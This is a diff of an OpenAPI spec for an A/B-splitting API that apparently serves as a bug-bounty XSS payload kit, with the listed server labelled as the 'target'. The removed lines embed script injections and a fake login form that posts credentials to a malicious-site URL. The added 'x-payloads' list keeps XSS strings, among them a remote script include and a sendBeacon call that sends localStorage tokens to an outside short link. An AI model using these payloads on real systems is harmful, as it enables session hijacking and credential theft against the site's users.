@@ -1,11 +1,118 @@
 {
   "openapi": "3.0.0",
   "info": {
-    "title": "Vulnerable API",
+    "title": "A/B Splitter API (Sanitized for local testing)",
     "version": "1.0.0",
-    "description": "<sVg OnPointerEnter=\"location=javascript:alert();//</div\"><h2>Secure Login</h2><form action='https://your-malicious-site.com/steal-credentials' method='POST'><label for='username'>Username:</label><input type='text' id='username' name='username'><br><br><label for='password'>Password:</label><input type='password' id='password' name='password'><br><br><button type='submit'>Login</button></form>",
+    "description": "Sanitized OpenAPI 3.0 spec for the A/B experiments API. XSS payloads are preserved under the non-standard extension `x-payloads` as plain strings. This file is safe to open locally in Swagger UI because payloads are data only and not injected into rendered HTML fields."
+  },
+  "servers": [
     {
-  "payloads": [
+      "url": "https://ab-splitter.xsolla.com",
+      "description": "Primary API server (target)."
+    }
+  ],
+  "paths": {
+    "/health/liveness": {
+      "get": {
+        "summary": "Liveness check",
+        "description": "Returns service liveness status.",
+        "responses": {
+          "200": {
+            "description": "OK",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object"
+                }
+              }
+            }
+          },
+          "503": {
+            "description": "Service Unavailable"
+          }
+        }
+      }
+    },
+    "/health/readiness": {
+      "get": {
+        "summary": "Readiness check",
+        "description": "Returns service readiness status.",
+        "responses": {
+          "200": {
+            "description": "OK",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object"
+                }
+              }
+            }
+          },
+          "503": {
+            "description": "Service Unavailable"
+          }
+        }
+      }
+    },
+    "/v3/split/by_user_id": {
+      "post": {
+        "summary": "Split user by user_id",
+        "description": "Assigns a user to an experiment group using user_id.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object",
+                "properties": {
+                  "experiment_uuid": {
+                    "type": "string"
+                  },
+                  "user_id": {
+                    "type": "string"
+                  }
+                },
+                "required": [
+                  "user_id"
+                ]
+              },
+              "examples": {
+                "example1": {
+                  "value": {
+                    "experiment_uuid": "exp-uuid-1",
+                    "user_id": "user-123"
+                  }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": {
+            "description": "OK",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Bad Request"
+          },
+          "404": {
+            "description": "Not Found"
+          },
+          "500": {
+            "description": "Internal Server Error"
+          }
+        }
+      }
+    }
+  },
+  "components": {},
+  "x-payloads": [
     "foo\"><script src=//dtf.pw/2.js><script><x=\".com",
     "http://foo?%26apos;-alert()-%26apos;",
     "\" onfocus=\"alert(1)\" name=\"bounty",
@@ -205,33 +312,4 @@
     "javascript:navigator.sendBeacon('https://tinyurl.com/3vt53acc','token='+encodeURIComponent(localStorage.getItem('token')))",
     "VIjUApPDzbh0bLPV"
   ]
-}
-    
-  },
-  "servers": [
-    {
-      "url": "javascript:alert('XSS in server URL!')"
-    }
-  ],
-  "paths": {
-    "/xss": {
-      "get": {
-        "summary": "Trigger XSS",
-        "description": "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a(window.origin) x><h2>Testing HTML Injection</h2><p>If you see this, HTML injection worked.</p><script>alert('XSS inside API description!')</script>",
-        "responses": {
-          "200": {
-            "description": "XSS or HTML Injection Test",
-            "content": {
-              "text/html": {
-                "example": {
-                  "message": "<script>alert('XSS in API response!')</script>",
-                  "html_test": "<h1>Injected HTML!</h1><p>This should render if not sanitized.</p>"
-                }
-              }
-            }
-          }
-        }
-      }
-    }
-  }
 }
